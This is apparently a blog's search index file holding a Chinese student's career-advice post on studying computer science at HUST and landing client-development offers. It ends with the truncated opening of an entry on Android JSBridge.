<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活</title>
    <url>/2020/05/24/university_1/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>首先原谅我用这样的标题来博得关注和点击，因为思前想后也只有我所拿到的Offer才最能在一定程度上代表能力，为我下面将要分享的内容作背书。</p>
<p>在最开始准备写这篇文章的时候只是想像往常那样放在我的博客上作为自己的回忆和总结，不太想去获得别人的关注；但另一个声音告诉我这些东西和之前的技术文章不太一样，这些经验和教训可能可以帮助到很多刚刚踏入校门的新人们，或多或少地产生一些价值。</p>
<p>既然决定了写这篇文章是为了创造价值，那么只有分享出来，让更多感兴趣的人看到才能创造更多的价值，这就是此时此刻你能看到这篇文章的原因。</p>
<a id="more"></a>
<hr>
<p>由于文章的篇幅已经远超最初的预想，所以会拆成几篇分别在<strong>微信公众号VirMe</strong>发出（确实是公众号最适合创作与分享，还烦请关注），所有文章共用开头部分，特此说明。</p>
<h2 id="个人介绍"><a href="#个人介绍" class="headerlink" title="个人介绍"></a>个人介绍</h2><p>笔者2016年高考考入华中科技大学计算机科学与技术专业，同年10月份加入学生技术团队<a href="https://hustunique.com/" target="_blank" rel="noopener">联创团队</a>Android组，后任组长。</p>
<p>2017年底（大二寒假）拿到今日头条（字节跳动）深圳研发中心Android开发实习生Offer，在深圳研发中心实习至2018年3月。</p>
<p>2018年4月加入新成立的今日头条武汉研发中心实习，2019年5月离职。</p>
<p>2019年春招拿到腾讯（微信）、蚂蚁金服（支付宝）、Airbnb的暑期实习Offer，2019年7月加入微信实习。</p>
<p>2019年秋招拿到字节跳动SSP（抖音）、微信***（转正）、猿辅导SP（斑马英语）校招Offer，最终选择留在微信，目前仍实习在职。</p>
<p>在我的大学四年中，有四年的Android开发经历，两年半的实习经历，有两款Google Play上架的应用，个人原创技术博客也收获了25w+的访问量，当然，最重要的是最后拿到了自己满意的Offer，也算是给大学生活画上一个比较完整的句号了。</p>
<h2 id="文章目的"><a href="#文章目的" class="headerlink" title="文章目的"></a>文章目的</h2><p>上面介绍的经历并不是为了显示我的经历有多牛逼，事实上在我认识的范围内我的经历还远远谈不上出彩。当我刚刚考入大学，进入我心仪的计算机专业时，觉得提升自己的技术、加入BAT这样的大厂就是我的目标，这也由此指引了我大学生活的方向。相信很多无论是不是刚入学的新生、也无论是不是计算机专业，都有着像我那时的想法。很幸运的是我在非典型的大学四年中找对了方向，也找到了方法，收获了很多的经验与教训，最终达到甚至稍稍超出了自己当初的立下那个目标。</p>
<p>现在回想起来，这很大程度上要归功于给我提出建议、给我指引的前辈们，没有前人的经验我们很难找到正确的方向与方法，以至于陷入无谓的迷茫与焦虑之中。当然在这过程中，也从自己的经历中认识到很多“<strong>假如我早点知道该多好</strong>”的问题。我所在的华中科技大学联创团队（学生技术团队）有着近20年的历史积累，通过前辈的方法与经验的传承，近年就业的队员几乎是人手几家大厂SP Offer，我想这些方法与经验应该是行之有效的，也是值得与大家分享的。</p>
<p>我写这篇文章的目的也正是在此，一是为了总结自己的大学四年；二是给有着和我一样的目标的同学们一些参考和建议（包括对应届生比较实用的面经），希望可以给读到这篇文章你们一些帮助，希望你们也可以达到自己的目标或是在追求更高的目标的路上更进一步，也算是作出一些微小的贡献；三也是为了帮助大家更好地认识客户端开发这个现在普遍认识不足却有着极大缺口的方向，也是给我所在的<strong>联创团队</strong>、<strong>微信团队</strong>打打广告。</p>
<hr>
<p><strong>虽然文章标题写的是客户端开发之路，但是文中80%以上的内容都是对于技术学习方向比较通用的内容；同时，本文主要面向毕业直接工作的同学，所以不会涉及到读研、出国相关的内容。</strong></p>
<p>最后，本文表达的内容都是一些自己的看法，也<strong>仅代表个人的观点</strong>，受文笔和经验所限，表达不当之处敬请包涵，也恳请经验更加丰富的前辈多多指正。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>大学四年的经历很长，总归不是三言两语就能表达清楚的，每个人所处的阶段不同可能感兴趣的内容也不同，为了保证阅读体验，会主要分为三篇文章（非通用内容和一些书籍推荐等会后面另行发出）：</p>
<ul>
<li>对刚进入大学、想要在未来从事开发工作的大一大二新生的一些建议</li>
<li>如何在大学阶段学习计算机并获得快速的技术成长</li>
<li>关于实习；如何准备面试、在面试中展现自己以及最终的选择</li>
</ul>
<p>本文是其中的第一篇，其他文章敬请关注公众号VirMe。</p>
<h2 id="（一）开始——步入大学生活"><a href="#（一）开始——步入大学生活" class="headerlink" title="（一）开始——步入大学生活"></a>（一）开始——步入大学生活</h2><h3 id="为什么选择计算机专业？"><a href="#为什么选择计算机专业？" class="headerlink" title="为什么选择计算机专业？"></a>为什么选择计算机专业？</h3><p>这是我经常问刚进入计算机系，或是面试联创团队（下称团队）的学弟学妹们的一个问题。我听到的答案其实大概有如下几种：</p>
<ul>
<li>父母让我选择计算机专业</li>
<li>我觉得当下学计算机就业轻松，并且收入不错</li>
<li>我喜欢玩电脑、打游戏，对计算机感兴趣</li>
<li>我有过编程经验，我喜欢编程</li>
</ul>
<p>这四个答案可以分为两类，一类是有强烈的外在驱动：当下风口、就业前景、收入水平；另一类则是自己的自驱力：我想要学。</p>
<p>确实，当下的计算机行业，在一阵阵的热潮之中，一直处于人才供不应求的阶段，由此也带来了相对较高的收益，在这样的背景下，计算机专业的录取分数线也水涨船高，在很多省份的录取分数已经超过了华科最王牌的机械、光电专业。我高考时619分就能进的计算机，三年后学弟的录取分数却高达650。不得不说这是一些家长和同学的功利心理导致的。但现实是残酷的，在被我问过这个问题的同学中，往往答案是后两种的同学最终进了团队，在技术上早早地取得优势，在能力上也远远超出了其他同学。</p>
<p>背后的原因其实很明显，大学的专业本来就是为了满足不同人发挥不同的兴趣特长而设立的，而在逐利的背景下，大批怀揣着高薪梦想，觉得录取到计算机专业就高枕无忧的同学涌入，殊不知就算是华科的计算机系，每年都会有不少的同学因为不能完成基本的课业而被退学，到了大四面临着无法按时毕业，在招聘季为了一份工作焦头烂额，更是有<strong>80%以上</strong>的同学本科毕业时甚至写不出一个没Bug的快速排序。</p>
<p><img src="/images/uni/1_1.png" width="60%" height="60%"/></p>
<p><strong>行业决定下限</strong>，这句话不假，只要你在大学四年中<strong>认真完成所有学校设立的课程</strong>，完成学业后可以比较轻松地找到一份“还算不错”的工作（华为每年都会在华科统一价批发走一大批学生），薪资也可以轻松超过绝大多数其他专业的同届同学。但是这并不代表不用付出相应的努力，计算机是一门知识非常系统的学科，也是一门学习曲线一开始较为陡峭的学科，这意味着从一开始就需要付出很大努力并且短期内很难看到直接的收益，从基础的数据结构、算法、C语言学起，对于一个刚接触计算机科学的新人来说无不是抽象且晦涩的，在我刚开始学习它们的很长一段时间里我都会问自己这些东西有什么用，为什么我写的程序只能在终端里面输出一些字符，怎么才能写出那种有界面能用的软件呢？事实上这些知识的作用在一段时间后才会体现出来，例如当需要自己使用C语言实现操作系统的一部分、需要理解操作系统线程调度算法、需要设计编译原理的抽象语法树时，没有前置的技术积累将会使得后续知识的学习变得寸步难行。</p>
<p><img src="/images/uni/1_2.png" alt=""></p>
<p>有很大一部分同学在真正开始学习计算机时并没有意识到这一点，在刚进入大学失去外在的束缚并且时间较为宽裕的情况下，没有付出足够的时间在这些基础的较为枯燥的课程上，导致在后面的课程中处处碰壁，使得没有完全掌握的内容越来越多，最终自暴自弃，失去了在宝贵的大学四年中更加深入地学习这些通用课程的机会。</p>
<p>而能支撑我们从一开始学习看似枯燥的知识到后面持续不断的付出与深入的，很多时候只有自己的自驱力，因为我喜欢计算机，才会心甘情愿付出比别人多几倍的时间；才会在别人翘课、游戏、参加各种活动的时候静下心来对着屏幕上的字符；才会在遇到一个又一个Bug的时候花上几个小时的时间去调试。这样的自驱力对于计算机的学习至关重要。</p>
<p>对我而言，在小学的时候因为数学好，被选去参加NOIP（信息学技术竞赛），那时候还是写的BASIC语言，虽然初中后因为县城的条件，没有再继续下去，但这段经历让我意识到什么是我真正热爱的、愿意付出自己所有的热情去做的事情。所以在高考成绩出来以后，不用十分钟我就确认了自己的志愿：华科的计算机、信安与软件。回想起来，就算一开始遇到了很多困难（大一的时候光是装Linux就装了两个礼拜……），也从来没有想过放弃，靠着兴趣确实做成了很多事情。</p>
<p>事实上，有着计算机兴趣并成功考入计算机专业的人是幸运的少数，对于自身没有多大兴趣又想毕业时拿到头部企业的高薪Offer的同学，我觉得对于功利的追求不会让一个人走得太远，但是兴趣是可以培养的，任何一门学科学到深入都是充满魅力的，尤其是计算机这种非常容易取得满足与成就感的学科（当然这点也不尽然是好事，后续文章会谈）。我相信任何一个有志于从事这个行业的同学都可以在不断深入的过程中找到自己的乐趣。</p>
<h3 id="科班与非科班"><a href="#科班与非科班" class="headerlink" title="科班与非科班"></a>科班与非科班</h3><p>在接触到的很多想加入团队或是想应聘头条或是腾讯的同学中，有不少不是计算机专业的，也就是所谓的非科班，他们常问的一个问题是，非科班的身份会不会对找工作有很大的影响？其实这个问题和另一个热门问题很相似：如何看待培训班培养出来的程序员。</p>
<p><img src="/images/uni/1_3.png" alt=""></p>
<p>在我看来，科班或者非科班就像985、211一样，都是一个人身上的tag，它们常被人用作评判一个人的标准之一，在没有其他任何可以参考的信息时，这些tag就成了衡量个人水平的唯一标准。但计算机的情况并非如此，在评判一个人能否胜任工作岗位时，这些tag的影响力远不如实实在在的实习经验和项目经验，这些项目往往能体现一个人的真实能力，而技术面试可以很容易判断作假的经历与项目。但在技术面试中，还有更重要的一部分，也是科班与非科班最容易体现出的区别。</p>
<p>前面说过，基础知识的积累决定了后续知识的学习能力，而科班则提供了从底层开始向上扩展的课程体系（虽然不尽完善与及时），但培训班和一些非科班同学则将重点放在了最上层和浅显的知识学习，也就是工作中直接接触，可以直接创造价值的那部分。因为在有限的时间内，对于这些知识的快速学习是最有助于看到成效和容易被接受的。把这部分知识学好了，能不能干活呢？或许可以，但是很少有没有系统的计算机知识的人可以深入到问题的背后探究其本质，这也是我们常自嘲“面向StackOverFlow/Github编程”和“Copy&amp;Paste工程师”真正所指的那批人。急功近利的后果是程序运作基本原理知识的缺失、是分析与解决根源问题的能力的缺失、是分析与设计复杂系统的潜力的缺失等等，最重要的是失去了底层能力的积累也就失去了进一步深入学习的基本能力，导致在技术道路上的停滞不前。</p>
<p><img src="/images/uni/1_4.png" width="60%" height="60%"/><br><img src="/images/uni/1_5.png" width="60%" height="60%"/></p>
<p>任何有过比较深入的编程经验的程序员都深知基础知识对于从业者的重要性，它在一定程度上代表了一个程序员的潜力与未来，这是为什么各个大厂的招聘要求与面试中都有着对基础知识的考察，非科班同学比较容易缺失的这点就成了就业中的劣势，也造成了一部分公司与面试官的成见。那么非科班的同学是不是就一定没机会与科班同学竞争了呢？绝对不是，但往往需要付出更多。除了需要自学与科班同学相同的基础知识之外，为了顺利毕业也要同时保证本学科的课程可以顺利过关，同时没有合理的安排、教师的指导与考试的束缚，非科班的同学需要更强的自驱力来克服上述的这些困难。</p>
<p>不过，我所认识的非科班的同学（也大都是团队的）最后体现出的能力与结果却都远远强于科班的大部分同学。微信同组有高我一届的船海学院学长大三暑假去了腾讯IEG的游戏引擎组实习，秋招又通过四轮面试加入了微信团队；和我大二一起拿到深圳头条实习Offer的同学是电信学院的；团队同组的机械学院同学大三加入了武汉头条，还从Android开发转到了iOS开发……这样的例子数不胜数，甚至我这届的团队队长也是所谓非科班的。我想，正如上一节所说的那样，也正是非科班的身份和强大的兴趣支持他们不断地付出更多的努力，最终走上了自己想要的路。</p>
<h3 id="路线选择（工作-读研-出国）"><a href="#路线选择（工作-读研-出国）" class="headerlink" title="路线选择（工作/读研/出国）"></a>路线选择（工作/读研/出国）</h3><p>本科的同学都会面临这样的问题，在四年本科结束以后，该做什么？这个问题对于计算机专业的同学，可能更加困难。相对于其他专业，计算机同学工作和出国的比例会更高一些，以华科为例，每年计院+软院选择工作、读研和出国的毕业生比例大概为5:3:2。在这里不过多分析各个方向的优劣，每个人的情况不同，也没有任何一个方向会比其他两个有明显的优势，每个人的选择都需要结合自身的情况做出选择，也需要为自己的选择负责，因为每个选择都意味着得与失，每个人想要的生活不同，参考别人的选择并无多大意义，更加值得参考的是选择背后的逻辑。</p>
<p>例如，对于对移动客户端、前端Web这些偏工程类的方向感兴趣的同学，毕业直接工作两年带来的经验和薪资收益<strong>通常</strong>会优于读研所带来的收益；对图形学、人工智能等科研性质浓厚的方向感兴趣或是想毕业后从教的同学读研几乎是必须的选择。</p>
<p>在这里想说的重点不是如何选择，<strong>而是要尽早作出选择</strong>。不同的选择努力的方向在很大程度上并不相通，读研的同学需要保证到课率、高质量完成作业和刷题备考以保证绩点可以排在年级前列；出国的同学需要提升语言能力以及科研经历；工作的同学则需要深入学习一个方向的技术、丰富自己的项目与实习经历。</p>
<p>因为时间是有限的，极少的人可以做到同时兼顾课内成绩在年级前列的同时深入学习一个方向的知识并有着丰富的项目/比赛经验，更不用说长时间的在外实习（当然我也认识几位传说级的学长做到了这些）。假设花费同样的精力可以在两个方向上做到90分+90分或是60分+120分，但当真正毕业走向一条道路时，120分所带来的收益会远超于90分。</p>
<p>非常现实的例子是，如果选择读研，花费大量时间完成的项目不会比提升成绩排名更有利于申请学校；反之，如果毕业时选择的是工作，那么加权平均成绩是90分或是60分不会有任何区别，但达到90分花费的精力会是60分的数倍（这里决不是说课内成绩无关紧要，后续文章再谈），把时间用在实习或是做项目上会更有利于找到一份好的工作。</p>
<p><strong>尽早地</strong>做出选择，意味着往后的大部分时间分配将会更有目的性，也避免了无谓的迷茫与焦虑，总的来说，就是<strong>专注地做一件事情，并把这件事情做到极致</strong>。</p>
<p>以我为例，因为比较厌倦应试，也没有出国的经济条件，所以几乎是在刚进入大学时就决定了毕业就工作这条路，所以大学的绝大多数时间都花在了基础知识和Android开发上，也正是由于非常专注与大量的时间投入，才能在大二找到一份难得的实习工作，慢慢走向正轨。当然，也付出了相应的代价，我的很多学校课程都是低分飘过（专业课例外，几乎都是85以上），所幸没有挂过科（这很重要），但这还是意味着我已经没有了任何退路：无法保研、考研，只有工作这唯一的路。</p>
<p>但也不是每个人都能很快地作出自己的选择的，这个时候的建议是在<strong>保证自己加权成绩</strong>的同时多去了解各个方向，大一的成绩对于最终能否保研至关重要，在作出决定之前要保证自己仍有选择的余地。最不利的情况就是前期没有想好自己想做什么，在课业上没有重视甚至挂科，导致早早失去保研的机会，也没有在技术上下功夫准备工作，到了大三才发现考研和就业都是难度极大，最终的出路也不会太好。</p>
<p>最后，再次强调没有任意一条路会来得更加轻松，就和前面为什么选择计算机的问题一样，只从功利的角度出发，通常走不太远，只有遵循自己的内心，付出相应的努力，才会有达到更高目标的可能。（再次再次说明，<strong>之后的内容只针对就业的同学</strong>）</p>
<h3 id="技术方向选择"><a href="#技术方向选择" class="headerlink" title="技术方向选择"></a>技术方向选择</h3><p>在选择工作这个方向之后，马上要面临的一个问题是——我该学些什么呢？</p>
<p>前文已经多次提到基础知识对于计算机从业者的重要性，如何学习基础知识这点会在后续文章单独讲，在这里想讲的是除开通用知识之外，在就业时通常需要选择一个特定的岗位，也就是需要我们对一个特定领域的知识有深入的了解。</p>
<p>为什么需要对一个方向深入了解呢？你可能听过一个高大上的词叫全栈工程师，指的是掌握多个领域技术，可以独立承担完整链路的开发工作的工程师，为什么不以成为全栈作为自己的技术方向呢？</p>
<p>事实上，在短短的大学四年中，从零开始到完全掌握一个技术方向都不太可能，更不用说掌握多个技术方向了。我在大学里几乎从一开始就在学习Android开发的内容，三年的经验到了公司里还是会被一年工作经验的同事吊打，大量实际的开发经验和校园中能接触到的项目经验不可同日而语。计算机科学与技术是一门知识体系庞大，分支众多的学科，对于零基础的新人，学习基础知识已经需要花费大量的时间，大部分的毕业生也只能做到深入了解一个方向的知识。基于这一点，国内公司大都会设置不同方向的开发岗位，培养某一方向上的专家工程师。</p>
<p><img src="/images/uni/1_6.png" width="60%" height="60%"/></p>
<p>那么应该怎样选择技术方向呢？首先记住一点：各个技术方向<strong>没有优劣之分，只是各有特点。</strong></p>
<h4 id="算法与工程"><a href="#算法与工程" class="headerlink" title="算法与工程"></a>算法与工程</h4><p>但在选择方向这一问题上，有着很多因为不了解、功利心或是从众心理造成的现象。在我刚进入大学的2016年，如果抓住一个计算机的新生问“你对哪个方向比较感兴趣？”，听到的回答十有八九会是“算法”，因为在很多刚接触计算机的新人眼里，“算法”听上去是充满难度与挑战、十分重要且核心的计算机领域，加上算法工程师的薪资通常也会高出其他岗位，它自然就成了很多人的理想出路；但他们没有看到的是，对很多人来说，算法的学习过程是十分枯燥无趣的，也需要有一定的数学基础和抽象思维能力，不是每个人都适合这样的学习路线，很多人兴致勃勃买了《算法导论》，但到毕业时却不曾读完一遍，这就是不了解和功利心带来的困境。</p>
<p>到了近两年，随着人工智能的火热，新生的回答更多的变成了“想学人工智能”，同样的原因，只不过来得更加猛烈。但对于人工智能的学习，只要稍作了解，就会知道人工智能技术远没有想象的那样高大上，更不用说继续深造几乎是这一路线的唯一选择。</p>
<p>抛开上述问题，即使你在了解之后真的对算法和人工智能感兴趣，并且也能接受它们的学习路线，你还是会面临一个极大的问题——<strong>工程岗和算法岗供需关系的极度不平衡</strong>。</p>
<p>下面是2019秋招时一名资深HR的朋友圈比较直接地说明了这一问题，在这里分享给大家（已经找不到来源，如有侵权，请联系删除）：</p>
<p><img src="/images/uni/1_7.png" width="50%" height="50%"/></p>
<p>图中提到了几个问题：</p>
<p>工程岗（客户端、前端、后台、游戏等）目前供不应求，尤其是客户端与前端，头条在19年更是为客户端专门设立了几万元的签字费、并放宽招聘要求到不要求有客户端开发经验以吸引学生投递，即使如此19年还是剩下了大量的工程岗hc没有招满，其他公司的情况也大致如此。这样的情况到了20年还是没有得到缓解，甚至愈演愈烈。</p>
<p>另一边，算法岗的情况却是严重的供过于求，有如千军万马过独木桥，比较靠前公司的算法岗更是神仙打架。</p>
<p>这样的结果其实在大家的认知与观念扭转过来之前是必然的。</p>
<p>算法岗的需求量相对于工程岗本来就相对较少，在加之近几年的移动互联网崛起，算法岗的需求没有增加多少，但工程岗尤其是客户端的需求却是猛增了好几倍。但大学中的大部分学生还是处于“把算法学好就肯定能找到好工作”的认知中，加之还有一部分学生因为没有一门深入的方向，就业时只能硬着头皮投递算法岗。</p>
<p>确实，算法能力的确是一名合格的程序员必不可少的基础能力，也是各大公司各大岗位面试时必定考察的内容，甚至Google、微软这样的外企只考察候选人的算法能力。但是，Google招聘的目标就是所有学生中的顶尖水平，在所有的通用能力中只有算法是适合在面试中进行考察并且很容易有区分度（Google的算法题较难）。通常，能在算法的学习上达到顶尖水平的学生在其他方向的潜力也是极大的。但对于工程岗日常开发，并不会涉及到非常复杂的算法，面试中考察的算法难度也相对较低，主要目的是考察基本的编码能力和编码风格、候选人准备的充分程度、逻辑思维能力以及思考的全面性，这些能力一部分是之前的积累，另一部分通过一段时间的练习完全可以达标（如何准备工程岗算法面试在后续文章再谈）。</p>
<p>在薪酬方面，确实在以往头部的算法岗会比工程岗高上一些，但可以在算法岗的激烈竞争中拿下头部Offer的人相对于工程岗来说是凤毛麟角，而在当今供需关系不平衡的背景下，算法岗薪资的优势已经近乎不复存在，很多公司已经开始不区分这两个岗位的薪资。在相对小很多的竞争中，工程岗通过努力拿到SP/SSP Offer从而在薪资上领先普通算法岗Offer的机会大很多，而各大公司对于工程岗头部人才的争抢程度远超想象。</p>
<h4 id="所谓“天花板”"><a href="#所谓“天花板”" class="headerlink" title="所谓“天花板”"></a>所谓“天花板”</h4><p>盲目选择的另一原因是听从了各种例如“前端工作太低级，后端开发才有深度”、“客户端开发就是天天画界面，不如做后端还能成为架构师”、“XXX没前途，几年就到天花板了，没竞争力”的言论，甚至很多工作几年的所谓前辈也会劝在校学生去做他们认为“有前途、天花板高”的方向，我大二在头条实习的时候同事就曾对我说过：“你条件这么好，做客户端可惜了，趁早转个后端吧”。</p>
<p>觉得偏应用、偏前台的岗位技术难度不大、没有发展空间，进而在不深入了解的情况下盲目选择后端方向，这是工程岗中客户端、前端尤其稀缺的原因。<strong>这样的认知对于刚进入大学的新人来说是非常不利的。</strong></p>
<p>前面说过，在大学四年内不太可能从零开始到完全掌握一个技术方向，所谓的“天花板”也只是一部分人在技术能力上停滞不前时的借口。更何况在大学中学习一个技术方向很多情况下<strong>只是系统地学习计算机基础知识的切入点</strong>。</p>
<p>以我比较熟悉的Android开发为例：</p>
<p>在学习Android开发的初期，确实需要掌握绘制界面这样看起来简单的技能，这是一个应用最上层的、展示给用户使用的部分，在学习界面绘制后，我们很快将会需要处理用户的输入事件、做出响应，在这个过程中，将会接触到很多系统提供的接口，由此，我们开始对用户（相对于系统而言）代码和系统间的交互方式有了一个基本的了解。</p>
<p>虽然一开始可能只是照着书本或者网上写一些自己也不懂什么作用的代码，但是一旦学会查阅文档，了解每个接口的作用与行为后，我们将会对系统的行为有进一步的了解。</p>
<p>当跨越熟悉接口这一阶段、有了对系统行为的初步认知后，我们已经可以独立完成简单的应用了，但当应用的逻辑进一步复杂化时，难免会遇到问题，在查阅资料，解决问题的过程中，为了完全理解系统的行为，我们将会跨出非常重要的一步：阅读系统源码（Android的系统源码是开源的）。由此开始，我们对于Android的学习不再仅限于开发应用、绘制界面本身，而是<strong>开始深入地探究一个系统背后的运行原理与设计理念。</strong></p>
<p>而Android作为一个非常成熟的操作系统，有着庞大而又清晰的分层设计：</p>
<p><img src="/images/uni/1_8.png" alt=""></p>
<p>纵向来看，Android自上而下地贯穿了应用层面到系统内核层面；横向来看，Android的各个子系统、子模块间相互独立，又有着交互与通信；Android同时也是一个基于Linux的操作系统，借由Android我们也可以一窥Linux的种种概念，例如几乎所有的Linux进程间通信方式在Android的源码中都有所体现，同时Android又根据自身的需求设计了大名鼎鼎的进程间通信框架Binder，从对Binder通信机制的学习中，我们可以看到一个驱动级别的组件，是如何通过系统和框架的层层封装，转变为我们日常开发中所能见到的Java层的AIDL工具。我也曾为了弄清楚“触摸事件道到底是哪里来的？”这一问题，<a href="https://www.viseator.com/2017/09/14/android_view_event_1/">顺着源码从Android SDK一路看到了触摸驱动</a>。而这样的例子数不胜数，每次深入探究的过程，都是充满趣味和最终的成就感的。</p>
<p>系统地阅读Android源码的过程，既是对软件架构与设计的理解和学习，又可以深入到系统底层实现中，理解操作系统的方方面面。可以说，这样的过程将我们零散的、琐碎的计算机知识有效地组织了起来，打通了我们从应用直至系统的整个知识体系，同时又可以驱使我们去不断补充相关知识，从各个方面提升自己的能力。</p>
<p>看到这里，你还会认为对Android开发的学习只是画画界面这么简单吗？事实上，这样“<strong>以技术方向为切入点，深入学习计算机的方方面面</strong>”的学习方式已经成了团队成员进行技术学习的宗旨之一（具体见后续文章），带来的结果是每个人在拥有对技术方向的深入了解的同时，在计算机的基础知识和全面认识方面的综合能力也远超他人，这也就解释了为什么很多队员在毕业后可以很轻松地转向另一个方向，团队Android组往届学长有去阿里做前端的、去美团做后端的，我在微信的岗位实际上也是游戏方向，并且在很短的时间内上手了iOS开发。</p>
<p>所以，个人的技术水平永远不是选择的方向所能决定的，了解一下各个方向的大牛们在做什么就能轻易地明白这一点。在大学这个阶段，选择一个技术方向时，更不应该考虑这些因素，是否能全身心地投入其中，保持不断的深入学习才是更重要的。</p>
<p>那么，应该如何学习呢？这个问题是下篇文章的重点，在这里就先吊个胃口了。</p>
<h4 id="可以试错"><a href="#可以试错" class="headerlink" title="可以试错"></a>可以试错</h4><p>既然真正学习的是计算机基础知识，那么选择的方向其实在一开始并不是那么重要，如果发现自己一开始对这个方向的了解出现了偏差，在毕业后并不想从事这个方向的工作，完全可以选择换一个方向，学到的基础知识永远不会作废。大学中一个极大的优势就是可以近乎无成本地试错。在毕业真正走向工作岗位后，主动对自己的岗位做出调整的机会就小很多，也要付出相应的代价。</p>
<p>所以，大胆地选择一个方向吧，没有什么可以担心的，Follow Your Heart!</p>
<h3 id="技术团队"><a href="#技术团队" class="headerlink" title="技术团队"></a>技术团队</h3><p>在本文的最后一部分，谈谈我在前文多次提到的<a href="https://hustunique.com/" target="_blank" rel="noopener">联创团队</a>及这样一个团队（或是类似的组织、实验室、甚至是学习小组等）能给我们带来什么。</p>
<p>首先介绍下我所加入的联创团队，联创团队是华科的一个学生技术团队，至今已经有20年的历史。很多人第一反应会是：这是个社团吗？其实团队和社团完全不同，我们没有真正意义上的指导老师，是一个纯学生组织，完全由学生自己负责团队的一切事务；但是我们却隶属于华中科技大学的启明学院，在学院的大楼中有自己独立的办公场地，是学院提供支持的创新团队，图为启明学院大楼、团队场地。</p>
<p><img src="/images/uni/1_9.png" alt=""><br><img src="/images/uni/1_10.png" alt=""></p>
<p>团队因兴趣而起，由一批志同道合的学生创立，联创二字就意为“联众人之志，创非凡之事”。团队成员曾在微软创新杯中多次取得名次；在2016世界大学生超算大赛获得全球第一名；举办了国内第一个面向大学生的Unique Hack-Day（编程马拉松）并延续六届。</p>
<p><img src="/images/uni/1_11.png" alt=""></p>
<p>目前团队内部按照兴趣分为了Android/iOS/Web/Game/AI/Design/PM/Lab八个组，在每年进行两次主要的招新和一次夏令营招新，招新会设置一轮笔试、一轮组内面试、一轮熬夜测试和最后的群体面试，比较有特色的是熬夜测试，新人会被要求在一个晚上的时间内（21点-次日7点）完成各组的编程题目，可以查阅任何资料，目的是考查热情和短时间内的学习能力。经过层层面试筛选出来的新人还需要经历一个学期的实习期，需要完成布置的项目任务。</p>
<p>这样的经历是非常难忘，我至今还记得那晚是我第一次为了一个目标如此投入，为了完成那六道题目忘记了时间的流逝和身体的困倦，大概也是从那时候开始明白全身心的投入可以完成怎样之前不曾想象的事情。</p>
<p>这一套严格的招新标准已经在团队实行了多年，本着宁缺毋滥的原则，目的是为了筛选出真正对计算机有学习热情，并且有不错的学习能力的同学。事实上每年能加入团队的新人每组都在个位数，甚至经常会出现一个不招的情况。</p>
<p>事实证明这样的招新标准带来的是团队内部较好的氛围和真正志同道合、可以共同进步的队友们，也就是满足文章前几节所说的：有自驱力、热情、并且明白自己想要什么的人。</p>
<p>那么，加入团队以后需要做什么呢？其实，除了唯一的时间要求和实习期的任务，没有其他任何的限制，也没有所谓的课程或是培训，前面说过团队的宗旨是把志同道合的同学聚在一起，而要做的事情则完全看大家的想法，我们会因为兴趣去做一些项目、一起打一个比赛、甚至是举办一个比赛。当然，绝大部分的时间都是在自学中度过的。</p>
<p>先来谈谈时间要求，团队会要求实习期的同学每周在团队办公场地待满40小时的时间（正式队员要求略低），为什么要设立这样一个（也是唯一的一个）制度呢？首先，这基于一个认识：<strong>只有付出了相应时间的投入，才有可能取得对应的收获</strong>，之后将要说的所有的学习的方式方法，都必须基于一点——投入足够的时间，这也是团队传承这么多年来留下的金规玉律；其次，为什么限制一定要在团队？一是为了形成一种约束，不是每个人都有着极强的自制力来保证每天的学习时间，所谓寝室是大学生的坟墓，专门的场地可以把时间集中起来，提高学习的效率；二是为了形成一种氛围，每个人的认知都有局限性，即使学习的是一个方向的知识，很多时候也做不到面面俱到，把大家都放到同一个屋子里，相互交流，取长补短，才能共同进步；三是为了做项目、打比赛方便，团队的前辈们也曾为了微软创新杯在学校外面租了个房子待了三个月，就像微信诞生的小黑屋那样，和志同道合的人在一起为一个目标奋斗的感觉是非常棒的。</p>
<p>团队会为每个新人分配一名学长作为mentor（导师），对新人的任务进度、代码质量、学习路线进行指导，这也是经验传承的一部分，很多东西（比如代码从一开始就注重code style、尽可能使用Google等等下篇文章的主要内容）都是这样一代代总结和传承下来的。有了这样的引路人做一对一不遗余力的指导，才能保证每个人的方向不至于走偏。</p>
<p>在每周的固定时间，各组内会进行meet up（周会），每个人需要详细介绍自己一周学习的内容，并一般会进行某个方面的分享，分享内容通常是自己最近深入学习或是觉得有意思的某个主题。在了解别人学习内容的过程中，可以知道同级的同学的学习进度，也会知道学长们在做的事情（也就是自己未来将会接触的内容），这样就能比较容易地知道自己还有哪些地方不足，以及未来需要掌握的内容。我也是从学长们的一次次分享中了解了原来Android的源码中有着这么多值得学习的点，明白了基础知识的重要性，知道了外面的企业需要我们拥有什么能力。而这些东西，没有团队的交流，我想不可能这么早就能意识到。也就是在不知不觉中，在团队中学到的东西已经远远超过了课内所学习的，所以很多学长毕业时会留下这样一句话：</p>
<blockquote>
<p>我的大学叫联创</p>
</blockquote>
<p>这句话到了我这里依然成立。</p>
<p><img src="/images/uni/1_12.png" alt=""></p>
<p>一个人的力量终究是有限的，当这条路上有人陪伴的时候才能走得更远，所以，如果你的学校有类似的组织，非常推荐你尝试加入。如果没有，我相信总会有和你志同道合的人等待着你，也同样会有已经走上这条路的学长愿意去与你分享这些经验，我也是其中的一员。</p>
<hr>
<p>这是全文的第一部分，介绍了在刚进入大学时需要思考的一些问题。在下一篇文章中，将主要会介绍一些在大学中学习计算机的一些方法与经验。</p>
<p><strong>如果以上的内容对你有所帮助，欢迎你把它分享给更多人，谢谢！</strong></p>
<p>如果有任何想法、疑问、意见或是建议，欢迎关注公众号VirMe留言交流。</p>
<p><img src="/images/wechat_channel.jpg" alt=""></p>
]]></content>
      <categories>
        <category>Summar</category>
      </categories>
      <tags>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title>Android JSBridge原理与实现</title>
    <url>/2018/09/07/android_JSBridge/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>​<code>WebView</code>​作为承载动态页面的容器，在安卓中本身只是一个用于加载​<code>web</code>​页面的视图控件，但<code>​web</code>​页面中常需要与​<code>Native​</code>进行交互动作，比如跳转到一个​<code>Native</code>​页面、弹出一条​<code>Toast</code>​提示、检测设备状态等。</p>
<p>在更加复杂的情境中：</p>
<ul>
<li>小程序<ul>
